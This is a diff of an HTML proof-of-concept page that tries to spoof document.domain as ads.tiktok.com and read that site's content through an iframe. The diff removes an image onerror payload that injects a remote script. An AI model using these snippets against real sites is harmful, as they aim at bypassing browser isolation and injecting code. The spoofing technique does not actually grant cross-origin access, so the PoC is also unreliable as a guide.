@@ -1,19 +1,35 @@
+<!DOCTYPE html>
 <html>
-  <head></head>
-   <script>
-  Object.defineProperty(document, 'domain', {
-  value: 'ads.tiktok.com',
-  writable: true
-});
-
-alert(document.domain)
-</script>
+  <head>
+    <title>PoC – document.domain spoof test</title>
+    <script>
+      try {
+        Object.defineProperty(document, 'domain', {
+          value: 'ads.tiktok.com',
+          writable: true
+        });
+        console.log('[+] Spoofed document.domain: ', document.domain);
+      } catch (e) {
+        console.error('[!] Could not spoof domain:', e.message);
+      }
+      window.onload = function () {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://ads.tiktok.com/';
+        iframe.style = "width:600px; height:400px;";
+        iframe.onload = function () {
+          try {
+            const doc = iframe.contentWindow.document;
+            console.log('Access to the iframe:', doc.body.innerHTML);
+          } catch (err) {
+            console.log('Access blocked:', err.message);
+          }
+        };
+        document.body.appendChild(iframe);
+      };
+    </script>
+  </head>
   <body>
-   <script>
-    setTimeout(function() {
-  console.log("Delay");
-}, 2000);
-</script>
-    <img src="x" onerror="let s = document.createElement('script'); s.src = 'https://sf-tk-sg.ibytedtos.com/obj/ad-creative-sg/7c1b0b5e453fbc09ee86797b98863130'; document.body.appendChild(s);">
+    <h2>Hello</h2>
   </body>
 </html>
+
